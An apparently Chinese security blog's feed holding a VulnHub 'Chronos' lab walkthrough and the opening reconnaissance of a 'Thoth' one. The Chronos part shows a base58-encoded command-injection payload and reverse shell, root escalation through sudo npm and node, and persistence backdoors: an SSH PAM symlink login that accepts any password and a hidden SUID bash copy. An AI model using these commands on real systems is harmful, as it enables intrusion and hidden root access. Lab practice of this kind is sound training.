<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://www.n1h1l157.live</id>
    <title>X_T • Posts by &#34;vulnhub 11-20&#34; tag</title>
    <link href="http://www.n1h1l157.live" />
    <updated>2021-10-31T16:00:00.000Z</updated>
    <category term="ENFJ" />
    <category term="ENFP" />
    <category term="ENTP" />
    <category term="ENTJ" />
    <category term="ESFJ" />
    <category term="ESFP" />
    <category term="ESTJ" />
    <category term="ESTP" />
    <category term="INFJ" />
    <category term="INTJ" />
    <category term="INFP" />
    <category term="INTP" />
    <category term="ISFJ" />
    <category term="ISFP" />
    <category term="ISTJ" />
    <category term="ISTP" />
    <category term="MBTI" />
    <category term="心理测试" />
    <category term="渗透测试" />
    <category term="灵性" />
    <category term="Linux" />
    <category term="记忆" />
    <category term="Trojan" />
    <category term="VULNHUB 1-10" />
    <category term="信息安全网址" />
    <category term="VULNHUB 11-20" />
    <category term="VULNHUB 21-30" />
    <category term="VULNHUB 31-40" />
    <category term="VULNHUB 41-50" />
    <category term="人生" />
    <category term="成长" />
    <category term="神学" />
    <category term="人生哲学" />
    <category term="历史" />
    <category term="社会" />
    <category term="生命" />
    <category term="命运" />
    <category term="爱情" />
    <category term="意义" />
    <category term="人性" />
    <category term="道德" />
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/113%20CHRONOS/</id>
        <title>VULNHUB 13 CHRONOS</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/113%20CHRONOS/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2hyb25vcy0xLDczNS8=&#34;&gt;https://www.vulnhub.com/entry/chronos-1,735/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDExNDQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15801144.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 CHRONOS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-263.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.238&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.238 -oN /tmp/chronos.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-264.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 80, 8080&lt;/p&gt;
&lt;h3 id=&#34;js-代码美化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js-代码美化&#34;&gt;#&lt;/a&gt; js 代码美化&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM4Lw==&#34;&gt;http://192.168.31.238/&lt;/span&gt; 收集信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-265.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;审查源代码，发现一串敏感代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-266.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;https://gchq.github.io/CyberChef/&lt;/span&gt; 上进行 js 代码美化&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-267.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;复制代码，并且写到 kali 上，开启简易 web，在网站上浏览详细内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-268.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到了一个可疑的 url 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD00dWdZRHVBa1NjQ0c1Z01jWmpFTjNtQUx5RzFkRDVaWXNpQ2ZXdlEydzlhbllHeUw=&#34;&gt;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 可疑密文：4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-269.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;base58-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#base58-解密&#34;&gt;#&lt;/a&gt; base58 解密&lt;/h3&gt;
&lt;p&gt;修改本地 hosts，访问此网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-270.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将可疑密文在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;https://gchq.github.io/CyberChef/&lt;/span&gt; 上进行解密，发现是 base58 加密&lt;br&gt;
 &lt;code&gt;&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;&lt;/code&gt; &lt;br&gt;
 即意味着服务上执行了 date ‘+Today is % A, % B % d, % Y % H:% M:% S.’&lt;br&gt;
想办法构造 payload 拼接此代码并进行加密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-271.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;date ‘+Today is %A, %B %d, %Y %H:%M:%S.’|ls&lt;br&gt;
 并且在 cyberchef 上进行 base58 加密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-272.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到密文：6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-273.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;访问 url 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD02bzRwVmZOdDV1NjhodktOckF5TnV5cjdhdDI1RGRtMThDRVptOEptWDJHWXlzTWI3V2Rn&#34;&gt;http://chronos.local:8000/date?format=6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;访问网址后并没有很明显的效果返回，利用 burp 做中间代理，拦截浏览器的数据，查看返回数据包，返回的是权限不足&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-274.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;修改 UA 头，将其改为网站 header 指向的 Chronos 重发数据包，返回数据成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-275.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;拼接linux命令反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拼接linux命令反弹&#34;&gt;#&lt;/a&gt; 拼接 linux 命令反弹&lt;/h3&gt;
&lt;p&gt;在 CyberChef 上获取到反弹 shell 的 base58 加密的字符&lt;br&gt;
 U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PUwNR&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-276.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;拼接到 url 地址中，并且监听本地的 4445 端口，等待 shell&lt;br&gt;
 等同于访问 http://chronos.local:8000/date?format=U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PuwNR&lt;br&gt;
 并修改 UA 为 Chronos&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-277.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接收到shell之后，使用python3 改为一个标准的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-278.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集服务器的相关信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo - l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/issue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh `which pkexec`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls /opt &amp;amp;&amp;amp; ls /var &amp;amp;&amp;amp; ls /home&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现服务器上无权限设置的错误，也不能利用 pkexec&lt;br&gt;
 进行提权，id 组也没有设置错误，没有 suid 的错误权限可利用文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-279.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;express-fileupload提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#express-fileupload提权&#34;&gt;#&lt;/a&gt; express-fileupload 提权&lt;/h3&gt;
&lt;p&gt;继续翻阅文件，查找的一个 chronos-v2 的文件夹，找到 server.js 中有 express-fileupload 的调用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-280.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接用谷歌搜索是否存在此组件的漏洞，果然找到了一个 exp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-281.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 github 上找到了 ejs 利用的代码，复制此 payload&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-282.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 payload 中的参数进行修改，反弹主机 ip 和端口，以及 ejs 的端口号&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-283.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启简易 web 服务，将此文件下载到目标靶机上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-284.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目标靶机通过运行 ejs.py 文件，shell 成功被反弹&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用python，&lt;span class=&#34;built_in&#34;&gt;stty&lt;/span&gt;得到一个标准的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-285.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;sudonpmnode提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudonpmnode提权&#34;&gt;#&lt;/a&gt; sudo (npm/node) 提权&lt;/h3&gt;
&lt;p&gt;查看相关权限的设置，发现 npm，node 都可以提权&lt;br&gt;
在 https://gtfobins.github.io/ 上找到提权命令进行提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;npm 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo npm exec /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;node 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo node -e &amp;#x27;child_process.spawn(&amp;quot;/bin/sh&amp;quot;, &amp;#123;stdio: [0, 1, 2]&amp;#125;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-286.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获取到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;ssh-pam-软链接维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-pam-软链接维权&#34;&gt;#&lt;/a&gt; SSH PAM 软链接维权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 靶机上执行：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查端口号看是否命令是否执行成功：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps aux | grep 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -tanlp | grep 12345&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-287.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 攻击机执行：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.238 -p 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接着输入任意密码就可以root用户权限登陆了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实际测试中发现，如果 root 用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：&lt;br&gt;
ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmltZXJhQDE5Mi4xNjguMzEuMjM4&#34;&gt;imera@192.168.31.238&lt;/span&gt; -p 12345 接着输入任意密码就可以 imera 用户权限登陆了&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在ssh的配置文件中开启root登陆，是否可以解决无法用root登陆的问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/ssh/sshd_config | grep PermitRootLogin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/ssh/sshd_config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service ssh restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.238 -p 12345&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-288.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 并不能直接登陆到 root 账户，需要其他的设置进入 root 账户&lt;/p&gt;
&lt;h3 id=&#34;suid-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-权限维持&#34;&gt;#&lt;/a&gt; SUID 权限维持&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;制作隐藏的SUID文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 4755 /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh /var/.hack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-289.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接靶机并用SUID文件提权至root&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh imera@192.168.31.238 -p 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/.hack -p &amp;amp; whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 维持到了 root，现用 imera 登陆，再用 /var/.hack 提权&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/112%20THOTH/</id>
        <title>VULNHUB 12 THOTH</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/112%20THOTH/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhvdGgtdGVjaC0xLDczNC8=&#34;&gt;https://www.vulnhub.com/entry/thoth-tech-1,734/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTkxODM3L2FydGljbGUvZGV0YWlscy8xMTk5NDQ5Mzc=&#34;&gt;https://blog.csdn.net/qq_39991837/article/details/119944937&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 THOTH：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-253.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.229&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.229 -oN /tmp/thoth.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-254.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 22, 80&lt;/p&gt;
